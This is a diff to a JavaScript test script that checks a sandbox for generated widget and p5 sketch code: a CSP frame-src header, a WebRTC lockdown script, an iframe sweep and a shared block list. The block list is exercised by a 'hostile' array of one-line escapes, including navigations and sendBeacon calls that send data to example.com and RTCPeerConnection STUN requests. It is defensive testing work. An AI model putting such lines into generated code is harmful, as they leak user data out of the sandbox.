@@ -26,11 +26,12 @@
 // `--builder` runs the same cases against another copy of the file (the
 // control: `git show HEAD:src/components/visuals/renderWidget.ts`).
 import { createRequire } from 'node:module';
-import { fileURLToPath } from 'node:url';
+import { fileURLToPath, pathToFileURL } from 'node:url';
 import { mkdtempSync, rmSync, readFileSync, mkdirSync } from 'node:fs';
 import { join, resolve, dirname } from 'node:path';
 import v8 from 'node:v8';
 import vm from 'node:vm';
+import { get } from 'node:http';
 
 const require = createRequire(import.meta.url);
 const esbuild = require('esbuild');
@@ -63,7 +64,8 @@ const stubs = {
 // its resolve dir, so a copy of it anywhere on disk resolves the same siblings.
 await esbuild.build({
     stdin: {
-        contents: readFileSync(builderPath, 'utf8') + '\nexport { WIDGET_THEME_TAIL as __TAIL } from "./widgetTheme";',
+        contents: readFileSync(builderPath, 'utf8') + '\nexport { WIDGET_THEME_TAIL as __TAIL } from "./widgetTheme";'
+            + '\nexport { SANDBOX_LOCKDOWN_JS as __LOCK, leavesTheFrame as __LEAVES } from "./sandboxLockdown";',
         resolveDir: join(root, 'src/components/visuals'),
         loader: 'ts',
         sourcefile: 'renderWidget.ts',
@@ -79,7 +81,7 @@ await esbuild.build({
     }],
     logLevel: 'silent',
 });
-const { buildWidgetDoc, __TAIL: TAIL } = require(out);
+const { buildWidgetDoc, __TAIL: TAIL, __LOCK: LOCKDOWN, __LEAVES: leavesTheFrame } = require(out);
 rmSync(scratch, { recursive: true, force: true });
 
 const POLICY = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:;";
@@ -108,6 +110,10 @@ function inspect(label, html, { ownHead = [] } = {}) {
             && (first.getAttribute('http-equiv') || '').toLowerCase() === 'content-security-policy',
             first ? `first is <${first.localName}>` : 'no head child');
         check(`${tag}: … with the whole policy`, first?.getAttribute('content') === POLICY, first?.getAttribute('content'));
+        const firstScript = d.querySelector('script');
+        check(`${tag}: the first script of the document takes WebRTC away, before anything else runs`,
+            first?.nextElementSibling === firstScript && firstScript?.textContent === LOCKDOWN,
+            `second head element <${first?.nextElementSibling?.localName}>, first script starts "${firstScript?.textContent.slice(0, 40)}"`);
         check(`${tag}: the theme style and the harness are head elements`,
             d.head.querySelector('style#__w-theme') !== null
             && [...d.head.querySelectorAll('script')].some(s => s.textContent.includes(JSON.stringify(TOKEN))));
@@ -655,6 +661,119 @@ const ROWS = `<style>.row{display:flex;align-items:center}</style>
     d.getElementById('r1').className = 'row open';
     await new Promise((r) => setTimeout(r, 80));
     check('a class change or a new element away from every slider runs no pass; one on a slider row does', untouched && l.style.minWidth === '108px', `${untouched} ${l.style.minWidth}`);
+}
+
+// ---------------------------------------------------------------------------
+// A visual does not leave its frame. Three layers, each asserted here; what
+// they add up to in a real browser was measured with the app's renderers in
+// Playwright, counting at a local listener: a navigation (Edge, Firefox, WebKit) and a
+// STUN packet (Edge; Firefox headless sent none even unsandboxed, Playwright's
+// WebKit has no WebRTC), because jsdom has neither navigation nor WebRTC.
+console.log('\nleaving the frame');
+{
+    // 1. The app's own enforced policy governs where its frames may go.
+    const appSrc = readFileSync(join(root, 'server/app.js'), 'utf8');
+    const enforced = appSrc.slice(appSrc.indexOf('const CSP_ENFORCED = ['), appSrc.indexOf("].join('; ');", appSrc.indexOf('const CSP_ENFORCED = [')));
+    check('the ENFORCED header limits frames to this app — not even a blob the frame made itself: frame-src \'self\'', enforced.includes(`"frame-src 'self'",`), enforced);
+
+    // 2. The first script takes WebRTC away, and nothing after it gets it back;
+    // nor can the code start a nested document, which would hold fresh copies.
+    const box = new JSDOM('<!doctype html><html><head></head><body></body></html>', { runScripts: 'outside-only', beforeParse(win) {
+        win.RTCPeerConnection = function RTCPeerConnection() {};
+        win.webkitRTCPeerConnection = function () {};
+        win.RTCDataChannel = function () {};
+    } }).window;
+    box.eval(LOCKDOWN);
+    box.eval(`try { window.RTCPeerConnection = function () {}; } catch (e) {}
+        try { delete window.RTCPeerConnection; } catch (e) {}
+        try { Object.defineProperty(window, 'RTCPeerConnection', { value: function () {} }); } catch (e) {}
+        try { webkitRTCPeerConnection = function () {}; } catch (e) {}`);
+    check('after the lockdown no peer connection can be made, put back or redefined',
+        box.eval('typeof RTCPeerConnection === "undefined" && typeof webkitRTCPeerConnection === "undefined" && typeof RTCDataChannel === "undefined"'));
+    // The code first breaks what the sweep would call, then writes its frames.
+    box.eval(`Element.prototype.remove = function () {}; Element.prototype.querySelectorAll = function () { return []; };
+        Object.defineProperty(NodeList.prototype, 'length', { get() { return 0; } });
+        var f = document.createElement('iframe'); f.srcdoc = '<p>x</p>'; document.body.appendChild(f);
+        var d = document.createElement('div'); d.innerHTML = '<span><iframe srcdoc="x"></iframe><object></object><embed></span>'; document.body.appendChild(d);`);
+    await new Promise(r => setTimeout(r, 0));
+    check('a frame the code writes, alone or inside markup, is gone before it loads — whatever it did to the DOM methods first',
+        box.document.body.innerHTML.search(/<(?:iframe|object|embed)\b/i) === -1, box.document.body.innerHTML.slice(0, 200));
+    const shut = (code) => { try { box.eval(code); return false; } catch { return true; } };
+    check('…and the ways around the sweep are shut: a shadow root, document.write/open, also called through the prototype',
+        shut(`document.body.attachShadow({ mode: 'open' })`) && shut(`document.write('<iframe srcdoc=x></iframe>')`) && shut(`document.open()`)
+        && shut(`Document.prototype.write.call(document, '<iframe srcdoc=x></iframe>')`) && shut(`Document.prototype.writeln.call(document, 'x')`)
+        && shut(`Document.prototype.open.call(document)`));
+    box.eval(`try { Element.prototype.attachShadow = HTMLElement.prototype.click; } catch (e) {}
+        try { Object.defineProperty(document, 'write', { value: function () {} }); } catch (e) {}`);
+    check('…and stay shut', shut(`document.body.attachShadow({ mode: 'open' })`) && shut(`document.write('x')`));
+    const p5Src = readFileSync(join(root, 'src/components/visuals/renderP5.ts'), 'utf8');
+    check('a p5 sketch\'s document runs the same lockdown first, right after its CSP',
+        /\$\{sketchCsp\(\)\}\r?\n<script>\$\{SANDBOX_LOCKDOWN_JS\}<\\\/script>/.test(p5Src));
+    check('…and a sketch that names a way out is refused before it is probed',
+        p5Src.indexOf('leavesTheFrame(sketch)') !== -1 && p5Src.indexOf('leavesTheFrame(sketch)') < p5Src.indexOf('await probeSketch('));
+
+    // 3. Code that names a way out goes back to be fixed: the client's check
+    // (p5) and the server's (widget builds) refuse the same things, from ONE
+    // list (server/leavingFrame.js).
+    const aiSrc = readFileSync(aiPath, 'utf8');
+    check('the server\'s widget vetoes are that list, not a copy of it',
+        /\.\.\.LEAVING_FRAME,/.test(aiSrc) && /import \{ LEAVING_FRAME \} from '\.\/leavingFrame\.js';/.test(aiSrc)
+        && /export \{ leavesTheFrame \} from '\.\.\/\.\.\/\.\.\/server\/leavingFrame\.js';/.test(readFileSync(join(root, 'src/components/visuals/sandboxLockdown.ts'), 'utf8')));
+    const scratchDb = mkdtempSync(join(cache, 'widget-csp-ai-'));
+    process.env.DB_PATH = join(scratchDb, 'gate.db');
+    process.env.VAULT_ROOT = join(scratchDb, 'vault');
+    const { finalizeWidgetHtml } = await import(pathToFileURL(aiPath).href);
+    // The header as served, not only as written (scratch library, set above).
+    const { createApp } = await import(pathToFileURL(join(root, 'server/app.js')).href);
+    const srv = createApp().listen(0, '127.0.0.1');
+    await new Promise(r => srv.once('listening', r));
+    const served = await new Promise((ok, no) => get({ host: '127.0.0.1', port: srv.address().port, path: '/api/build', agent: false },
+        r => { r.resume(); ok(String(r.headers['content-security-policy'] || '')); }).on('error', no));
+    await new Promise(r => srv.close(r));
+    check('…and the app SENDS it', served.split(';').map(s => s.trim()).includes("frame-src 'self'"), served);
+    const asBuild = (js) => `<!doctype html><html><head></head><body><div id="w">x</div><script>${js}</script></body></html>`;
+    const serverRefuses = (js) => { try { finalizeWidgetHtml(asBuild(js)); return false; } catch { return true; } };
+    const hostile = [
+        "location.href = 'https://example.com/?d=' + data;",
+        "window.location = 'https://example.com/';",
+        "document.location.assign('https://example.com/');",
+        "setTimeout(function () { location.replace('https://example.com/'); }, 300);",
+        "top.location = 'https://example.com/';",
+        "var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:example.com' }] });",
+        "new webkitRTCPeerConnection({});",
+        "navigator.sendBeacon('https://example.com/', data);",
+        "window.open('https://example.com/');",
+        "location = 'https://example.com/?d=' + data;",
+        "var f = document.createElement('iframe'); f.srcdoc = page;",
+        "var f = createElement('iframe');",
+        "host.attachShadow({ mode: 'open' }).innerHTML = markup;",
+    ];
+    const benign = [
+        "var location = { x: 3, y: 4 }; draw(location.x);",
+        "el.style.top = '4px'; rect.top.toFixed(1);",
+        "function open(panel) { panel.hidden = false; } open(menu);",
+        "dialog.open = true; parent.postMessage({ type: 'size' }, '*');",
+        "var relocation = 1; body.location = 2;",
+        "const location = 'Paris'; let a = location == 'Paris';",
+        "var p = createElement('p'); var c = createElement('canvas');",
+        '<div data-location="north"></div>',
+    ];
+    const markupOnly = [
+        '<iframe srcdoc="x"></iframe>', '<IFRAME src="about:blank">', '<object data="x"></object>', '<embed src="x">',
+        '<meta http-equiv="refresh" content="0;url=https://example.com/">',
+    ];
+    const keptMarkup = asBuild('1;').replace('<body>', '<body><div data-location="north" data-location-href="x">Map</div>');
+    check('a widget build whose markup carries a data-location attribute is kept', (() => { try { finalizeWidgetHtml(keptMarkup); return true; } catch { return false; } })());
+    for (const m of markupOnly) {
+        check(`a widget build carrying ${m.slice(0, 40)} is refused`, (() => { try { finalizeWidgetHtml(asBuild('1;').replace('<body>', `<body>${m}`)); return false; } catch { return true; } })());
+    }
+    for (const js of hostile) {
+        check(`refused on both sides: ${js.slice(0, 60)}`, !!leavesTheFrame(js) && serverRefuses(js), `client ${leavesTheFrame(js)}, server ${serverRefuses(js)}`);
+    }
+    for (const js of benign) {
+        check(`kept on both sides: ${js.slice(0, 60)}`, !leavesTheFrame(js) && !serverRefuses(js), `client ${leavesTheFrame(js)}, server ${serverRefuses(js)}`);
+    }
+    try { rmSync(scratchDb, { recursive: true, force: true }); } catch { /* the library is still open; node_modules/.cache is scratch */ }
 }
 
 console.log(`\n${pass} passed, ${fail} failed`);
